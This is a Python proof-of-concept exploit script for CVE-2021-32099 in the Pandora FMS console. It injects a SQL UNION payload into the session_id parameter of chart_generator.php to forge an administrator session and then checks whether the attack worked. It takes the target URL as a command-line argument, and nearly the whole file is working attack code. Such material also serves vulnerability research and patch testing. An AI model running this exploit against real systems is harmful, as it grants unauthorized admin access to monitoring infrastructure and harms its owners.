import requests
import argparse

s = requests.Session()
def sqli_to_gain_session_admin(base_url: str) -> str:
    """ CVE-2021-32099: SQL Injection to gain session admin 
        Args:
            `base_url`: Base URL of the application (Ex: http://localhost:8080/pandora_console)
        Returns: 
            `id_session`: The session with admin privileges
    """

    # Step 1: Init Access to get a "NULL" `id_session`
    res = s.get(
        url=f"{base_url}/include/chart_generator.php",
    )
    id_session = res.cookies.get("PHPSESSID")
    print(f"[*] First get `id_session` with NULL privilege: {id_session}")

    # Step 2: SQL Injection to gain session admin
    res = s.get(
        url=f"{base_url}/include/chart_generator.php",
        params={
            "session_id": "' UNION SELECT '1',2,'id_usuario|s:5:\"admin\";"
        }
    )
    id_session = res.cookies.get("PHPSESSID")
    print(f"[*] Then perform SQL Injection to gain admin privilege...")

    # Step 3: Verify the session
    if "Pandora FMS Graph ( - )" not in res.text:
        print("[-] Failed to gain admin session")
    else:
        print("[+] Successfully gained admin session!!!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='PoC for CVE-2021-32099')
    parser.add_argument('-u', '--url', type=str, help='Base URL of the application (Ex: http://localhost:8080/pandora_console)', required=True)
    args = parser.parse_args()
    sqli_to_gain_session_admin(args.url)